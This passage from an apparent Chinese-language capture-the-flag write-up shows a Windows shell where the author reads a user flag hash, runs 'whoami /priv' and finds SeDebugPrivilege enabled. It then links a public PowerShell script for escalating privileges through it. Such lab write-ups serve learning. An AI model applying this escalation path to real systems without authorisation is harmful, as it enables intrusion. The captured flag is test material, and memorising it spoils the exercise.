----                -------------         ------ ----                                                                  
-ar---       11/26/2024   9:59 PM             34 user.txt                                                              


PS C:\Users\alaading\Desktop> type user.txt
type user.txt
b579e28933415d760f073634f2dbf586
PS C:\Users\alaading\Desktop> 

~~~

查看权限，发现SeDebugPrivilege开放

~~~
PS C:\programdata> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

~~~

找到利用[脚本](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)




